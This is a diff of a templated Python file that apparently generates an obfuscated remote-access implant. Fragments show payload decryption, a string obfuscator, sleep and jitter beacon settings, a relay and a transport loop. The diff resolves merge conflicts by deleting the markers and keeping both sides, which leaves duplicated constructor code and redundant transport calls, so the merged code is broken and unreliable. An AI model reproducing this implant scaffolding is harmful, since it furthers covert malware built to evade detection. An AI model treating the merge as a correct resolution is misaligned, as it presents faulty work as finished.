@@ -383,7 +383,6 @@ def _xor(key: bytes, data: bytes) -> bytes:
 def _sha256(b):
     return _hl.sha256(_enc(b)).hexdigest()
 
-<<<<<<< HEAD
 
 def _scrub(*buffers) -> None:
     """Best-effort overwrite of sensitive bytes buffers.
@@ -475,10 +474,9 @@ def _decrypt_payload(envelope: bytes) -> bytes:
     except Exception as e:
         _log(f"payload decryption failed ({e})", "debug")
         return b""
-=======
 _LOG_LEVELS = {"debug": _lg.DEBUG, "info": _lg.INFO,
                "warning": _lg.WARNING, "error": _lg.ERROR}
->>>>>>> origin/nextgen
+
 
 def _log(msg, level="info"):
     if level == "debug" and not dbg:
@@ -503,7 +501,6 @@ def _log(msg, level="info"):
 # source *reads*; the runtime behaviour — including the TCP listener
 # handshake — is byte-for-byte identical to the plaintext build.
 
-<<<<<<< HEAD
 {% set _obf_key = cfg.aes_key or rnd_str(32) %}
 {% set _obf_key2 = rnd_str(32) %}
 
@@ -525,11 +522,9 @@ class _Obfuscator:
         self._aliases: dict = {}
 
     # -- string table --------------------------------------------------
-=======
     def __init__(self, key: str = "{{ cfg.obfuscation_key or rnd_str(32) }}"):
         self._key = _enc(key or _sg.printable[:16])
         self._table: list[bytes] = []
->>>>>>> origin/nextgen
 
     def store(self, literal: str) -> str:
         """Encrypt a literal; return the runtime retriever expression."""
@@ -2363,7 +2358,6 @@ def main():
     except Exception as e:
         _log(f"relay error: {e}", "debug")
     {% endif %}
-<<<<<<< HEAD
     base_sleep = {{ cfg.sleep }}
     jitter_pct = {{ cfg.jitter }}
     transport_name = "{{ transport }}"
@@ -2376,9 +2370,7 @@ def main():
             _log("interrupted", "debug")
         return
     transport = make_transport()
-=======
     failures = 0
->>>>>>> origin/nextgen
     while True:
         transport = make_transport()
         try:
